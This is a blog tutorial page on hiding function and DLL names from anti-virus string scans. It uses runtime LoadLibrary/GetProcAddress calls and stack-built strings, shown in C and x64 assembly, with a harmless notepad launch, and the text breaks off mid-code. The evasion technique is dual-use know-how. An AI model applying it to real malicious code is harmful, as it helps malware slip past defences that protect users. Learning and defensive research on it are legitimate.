<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AccidentalRebel.com - Articles by AccidentalRebel</title>
    
    <link href="https://www.accidentalrebel.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="AccidentalRebel.com Atom Feed" />
    
    <link rel="stylesheet" href="../theme/css/main.css">
    
</head>
<body>
    <div class="progress-bar" id="progress"></div>
    
    <header>
        <div class="container">
            <nav>
                <a href="../" class="site-title">AccidentalRebel.com</a>
                <button class="menu-toggle" onclick="toggleMenu()">☰</button>
                <ul class="nav-links" id="navLinks">
                    <li><a href="../archives.html">Archives</a></li>
                    <li><a href="../categories.html">Categories</a></li>
                    <li><a href="../tags.html">Tags</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <!-- Comic strip divider -->
    <div class="comic-container">
        <div class="comic-strip"></div>
    </div>

    <main>
        <div class="container">
    <article class="post-item">
        <header class="article-header">
            <h2 class="post-title">
                <a href="../string-av-evasion-in-x64-assembly-part-2.html">String anti-virus evasion in x64 assembly (Part 2)</a>
            </h2>
            <div class="article-meta">
                <time datetime="2022-07-09T12:11:00+08:00">Sat 09 July 2022</time>
                <span>•</span>
                <a href="../category/misc.html">misc</a>
            </div>
        </header>

        <div class="article-content">
            <p>In <a href="string-av-evasion-in-x64-assembly-part-1">my last blog post</a>, I discussed a way to hide parameter strings from being detected by an anti-virus. The solution was simple and it worked. However, it was incomplete as strings of function calls and loaded DLLs were still detectable in memory.</p>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-2-01" src="../images/string-anti-virus-evasion-in-x64-assembly-part-2-01.png" /></p>
<p>In this post I'll be talking about the other technique from the same <a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/">blog post</a> we were following before. It does a good job of explaining the concept which I'll be covering here too. I will also be writing the code in assembly as an added bonus, so we can better understand what goes on under the hood.</p>
<h2 id="the-problem">The problem</h2>
<p>Let's revisit our code from the last time. We have two functions being called <code>ShellExecuteA</code> and <code>ExitProcess</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;shellapi.h&gt;</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="sc">&#39;n&#39;</span><span class="p">,</span><span class="sc">&#39;o&#39;</span><span class="p">,</span><span class="sc">&#39;t&#39;</span><span class="p">,</span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="sc">&#39;p&#39;</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="sc">&#39;d&#39;</span><span class="p">,</span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="n">ShellExecuteA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SW_SHOW</span><span class="p">);</span>

<span class="w">    </span><span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>Upon compiling the program, the compiler takes the list of all functions used and places them in the executable (In this case, in the <code>.rdata</code> segment) as a readable string:</p>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-2-07" src="../images/string-anti-virus-evasion-in-x64-assembly-part-2-07.png" /></p>
<p>A function name like <code>ShellExecuteA</code> will be sure to raise some eyebrows so we do not want it to be detectable. To hide this we need to do load the DLL at runtime by using <code>LoadLibrary</code> and <code>GetProcAddress</code>.</p>
<h2 id="coding-in-c">Coding in C</h2>
<p><code>LoadLibrary</code> accepts a string containing the DLL that we want to load.</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hShell32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">&quot;shell32.dll&quot;</span><span class="p">);</span>
</code></pre></div>

<p>This loads the DLL's code into memory and returns a handle to that location. We can see the result of this when we look at the memory map in a debugger. Here's the memory map prior to calling <code>LoadLibrary</code>:</p>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-2-03" src="../images/string-anti-virus-evasion-in-x64-assembly-part-2-03.png" /></p>
<p>And here's what it looks like after:</p>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-2-04" src="../images/string-anti-virus-evasion-in-x64-assembly-part-2-04.png" /></p>
<p>The <code>LoadLibrary</code> API loaded <code>shell32.dll</code> along with it's dependencies into memory. We can also see that it automatically handled where the new DLLs will be placed. In this case, in between pre-existing ones.</p>
<hr />
<h3 id="aside-how-do-we-know-which-dll-is-needed">Aside: How do we know which DLL is needed?</h3>
<blockquote>
<p>We can find out which DLL is needed by a function by looking at it's <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">MSDN documentation</a>. Scroll at the end of every function documentation to see the "Requirements" section that lists the DLL that it needs.</p>
</blockquote>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-2-02" src="../images/string-anti-virus-evasion-in-x64-assembly-part-2-02.png" /></p>
<hr />
<p><code>LoadLibrary</code> then returns a <code>HANDLE</code> object which we can then pass to <code>GetProcAddress</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="n">_ShellExecuteA</span><span class="w"> </span><span class="n">fShellExecuteA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">_ShellExecuteA</span><span class="p">)</span><span class="w"> </span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hShell32</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ShellExecuteA&quot;</span><span class="p">);</span>
</code></pre></div>

<p><code>GetProcAddress</code> looks through the library we loaded and returns the address of the <code>ShellExecuteA</code> function. This address needs to be cast to a typedef first before it can be called. This means we need to know the structure of the typedef, which we can determine by looking at the "Syntax" section in MSDN.</p>
<p>Here's the syntax for <code>ShellExecuteA</code> according to <a href="https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea">its documentation</a>:</p>
<div class="codehilite"><pre><span></span><code><span class="n">HINSTANCE</span><span class="w"> </span><span class="nf">ShellExecuteA</span><span class="p">(</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w"> </span><span class="n">HWND</span><span class="w">   </span><span class="n">hwnd</span><span class="p">,</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w"> </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpOperation</span><span class="p">,</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">           </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpFile</span><span class="p">,</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w"> </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpParameters</span><span class="p">,</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w"> </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpDirectory</span><span class="p">,</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">           </span><span class="n">INT</span><span class="w">    </span><span class="n">nShowCmd</span>
<span class="p">);</span>
</code></pre></div>

<p>And here's our typedef implementation:</p>
<div class="codehilite"><pre><span></span><code><span class="k">typedef</span><span class="w"> </span><span class="n">HINSTANCE</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">_ShellExecuteA</span><span class="p">)</span><span class="w"> </span><span class="p">(</span>
<span class="w">    </span><span class="n">HWND</span><span class="w">   </span><span class="n">hwnd</span><span class="p">,</span>
<span class="w">    </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpOperation</span><span class="p">,</span>
<span class="w">    </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpFile</span><span class="p">,</span>
<span class="w">    </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpParameters</span><span class="p">,</span>
<span class="w">    </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpDirectory</span><span class="p">,</span>
<span class="w">    </span><span class="n">INT</span><span class="w">    </span><span class="n">nShowCmd</span>
<span class="p">);</span>
</code></pre></div>

<p>When everything is setup properly, the variable <code>fShellExecuteA</code> can now be used as a function.</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="n">fShellExecuteA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SW_SHOW</span><span class="p">);</span>
</code></pre></div>

<p>Combining these together, this is what our code will look like:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>

<span class="k">typedef</span><span class="w"> </span><span class="n">HINSTANCE</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">_ShellExecuteA</span><span class="p">)</span><span class="w"> </span><span class="p">(</span>
<span class="w">    </span><span class="n">HWND</span><span class="w">   </span><span class="n">hwnd</span><span class="p">,</span>
<span class="w">    </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpOperation</span><span class="p">,</span>
<span class="w">    </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpFile</span><span class="p">,</span>
<span class="w">    </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpParameters</span><span class="p">,</span>
<span class="w">    </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpDirectory</span><span class="p">,</span>
<span class="w">    </span><span class="n">INT</span><span class="w">    </span><span class="n">nShowCmd</span>
<span class="p">);</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hShell32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">&quot;shell32.dll&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">_ShellExecuteA</span><span class="w"> </span><span class="n">fShellExecuteA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">_ShellExecuteA</span><span class="p">)</span><span class="w"> </span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hShell32</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ShellExecuteA&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="sc">&#39;n&#39;</span><span class="p">,</span><span class="sc">&#39;o&#39;</span><span class="p">,</span><span class="sc">&#39;t&#39;</span><span class="p">,</span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="sc">&#39;p&#39;</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="sc">&#39;d&#39;</span><span class="p">,</span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="n">fShellExecuteA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SW_SHOW</span><span class="p">);</span>

<span class="w">    </span><span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>This is not yet done, however, as <code>strings.exe</code> can still detect our strings. This is because we now have strings "shell32.dll" and "ShellExecuteA" as parameters for <code>LoadLibrary</code> and <code>GetProcAddress</code>. And these are placed in the <code>.data</code> segment in memory.</p>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-2-05" src="../images/string-anti-virus-evasion-in-x64-assembly-part-2-05.png" /></p>
<p>This is where we can use the technique that we used in <a href="string-av-evasion-in-x64-assembly-part-1">part 1</a>. By declaring the string as an array as a local variable, the data is placed on the stack instead of in the <code>.data</code> segment. </p>
<p>Applying this technique gives us the following:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">ca_shell32</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="sc">&#39;s&#39;</span><span class="p">,</span><span class="sc">&#39;h&#39;</span><span class="p">,</span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="sc">&#39;l&#39;</span><span class="p">,</span><span class="sc">&#39;l&#39;</span><span class="p">,</span><span class="sc">&#39;3&#39;</span><span class="p">,</span><span class="sc">&#39;2&#39;</span><span class="p">,</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="sc">&#39;d&#39;</span><span class="p">,</span><span class="sc">&#39;l&#39;</span><span class="p">,</span><span class="sc">&#39;l&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hShell32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LoadLibrary</span><span class="p">(</span><span class="n">ca_shell32</span><span class="p">);</span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">ca_shellExA</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="sc">&#39;S&#39;</span><span class="p">,</span><span class="sc">&#39;h&#39;</span><span class="p">,</span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="sc">&#39;l&#39;</span><span class="p">,</span><span class="sc">&#39;l&#39;</span><span class="p">,</span><span class="sc">&#39;E&#39;</span><span class="p">,</span><span class="sc">&#39;x&#39;</span><span class="p">,</span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="sc">&#39;c&#39;</span><span class="p">,</span><span class="sc">&#39;u&#39;</span><span class="p">,</span><span class="sc">&#39;t&#39;</span><span class="p">,</span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="sc">&#39;A&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="n">_ShellExecuteA</span><span class="w"> </span><span class="n">fShellExecuteA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">_ShellExecuteA</span><span class="p">)</span><span class="w"> </span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hShell32</span><span class="p">,</span><span class="w"> </span><span class="n">ca_shellExA</span><span class="p">);</span>
</code></pre></div>

<p>And now we can see that it works!</p>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-2-06" src="../images/string-anti-virus-evasion-in-x64-assembly-part-2-06.png" /></p>
<h2 id="converting-to-assembly">Converting to assembly</h2>
<p>As promised, we'll be converting the code above into x64 windows assembly. It's an extra step, but can give us a better understanding by approaching it from a different programming language.</p>
<p>Starting from the beginning, we'll be using <code>LoadLibraryA</code> and <code>GetProcAddress</code> to dynamically load the <code>ShellExecuteA</code> function at runtime. </p>
<p>If we fast forward a bit, here's what we'll end up with:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">str_shell32</span><span class="p">]</span><span class="w">     </span><span class="c1">; Load &quot;shell32.dll&quot; string</span>
<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">LoadLibraryA</span><span class="w">       </span><span class="c1">; Call &quot;LoadLibraryA&quot;</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span><span class="w">               </span><span class="c1">; Save result of LoadLibraryA to rcx</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">str_shexa</span><span class="p">]</span><span class="w">       </span><span class="c1">; Load &quot;ShellExecuteA&quot; string</span>
<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">GetProcAddress</span><span class="w">     </span><span class="c1">; Call &quot;GetProcAddress&quot;</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rbx</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span><span class="w">               </span><span class="c1">; The address of &quot;ShellExecuteA&quot; is saved to rbx</span>
<span class="w">    </span><span class="na">...</span><span class="w">                        </span>
<span class="w">    </span><span class="no">...</span><span class="w"> </span>
<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">rbx</span><span class="w">                </span><span class="c1">; Call &quot;ShellExeecuteA&quot;</span>
</code></pre></div>

<p>Wait, that's it? Yes! </p>
<p>This is the one of those rare moments that the Assembly code is more straightforward than C. This is because the value returned by <code>GetProcAddresss</code> is already an address. Since assembly deals with memory addresses, there's no need for any conversion like we did in the C version. The address can be called directly.</p>
<p>And just like the previous one, the code above is still not complete. The "shell" strings are still visible via <code>strings.exe</code> so we need to apply the technique again from Part 1. I won't be showing it step by step here anymore as it's quite lengthy.</p>
<p>This means that this example piece of code:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">str_shell32</span><span class="p">]</span><span class="w">     </span><span class="c1">; Load &quot;shell32.dll&quot; string</span>
<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">LoadLibraryA</span><span class="w">       </span><span class="c1">; Call &quot;LoadLibraryA&quot;</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
</code></pre></div>

<p>Will now be like this:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">          </span><span class="c1">; Place &quot;shell32.dll&quot; string to the stack</span>
<span class="w">    </span><span class="nf">addstr2stack</span><span class="w"> </span><span class="err">&quot;</span><span class="no">s</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">h</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="mi">3</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="mi">2</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="p">.</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">d</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0x0</span><span class="w"> </span>
<span class="w">    </span><span class="no">lea</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">]</span>

<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">LoadLibraryA</span><span class="w"> </span><span class="c1">; Call &quot;LoadLibraryA&quot;</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
</code></pre></div>

<p><code>addstr2stack</code> is a macro we've written before <a href="string-av-evasion-in-x64-assembly-part-1">in part 1</a>. It makes declaring an string array easier.</p>
<p>Combining everything again, here's the final assembly code with comments:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
<span class="w">    </span><span class="nf">mov</span><span class="w">     </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>

<span class="w">    </span><span class="c1">;; = START LOADLIBRARY ===========================================</span>

<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">         </span><span class="c1">; Place &quot;shell32.dll&quot; string to the stack</span>
<span class="w">    </span><span class="nf">addstr2stack</span><span class="w"> </span><span class="err">&quot;</span><span class="no">s</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">h</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="mi">3</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="mi">2</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="p">.</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">d</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0x0</span><span class="w"> </span>
<span class="w">    </span><span class="no">lea</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">]</span>

<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">LoadLibraryA</span><span class="w"> </span><span class="c1">; Call LoadLibraryA</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>

<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">         </span><span class="c1">; Release &quot;shell32.dll&quot; string from stack</span>

<span class="w">    </span><span class="c1">;; = END LOADLIBRARY ===========================================</span>


<span class="w">    </span><span class="c1">;; = START GETPROCADDRESS ===========================================</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span><span class="w">        </span><span class="c1">; Save value to rcx (1st parameter register)</span>

<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">         </span><span class="c1">; Place &quot;ShellExecuteA&quot; string to the stack</span>
<span class="w">    </span><span class="nf">addstr2stack</span><span class="w"> </span><span class="err">&quot;</span><span class="no">S</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">h</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">E</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">x</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">c</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">u</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">t</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">A</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0x0</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">]</span>

<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">GetProcAddress</span><span class="w">  </span><span class="c1">; Call GetProcAddress</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>

<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">         </span><span class="c1">; Release &quot;ShellExecuteA&quot; from stack</span>

<span class="w">    </span><span class="c1">;; = END GETPROCADDRESS ===========================================</span>


<span class="w">    </span><span class="c1">;; = START SHELLEXECUTEA ===========================================</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r12</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span><span class="w">        </span><span class="c1">; Save address of &quot;ShellExecuteA&quot; to r12 (To be called later)</span>

<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">         </span><span class="c1">; Place &quot;notepad&quot; string to the stack</span>
<span class="w">    </span><span class="nf">addstr2stack</span><span class="w"> </span><span class="err">&quot;</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">o</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">t</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">p</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">a</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">d</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0x0</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">]</span>

<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x5</span>
<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x0</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>

<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_open</span><span class="p">]</span><span class="w"> </span>
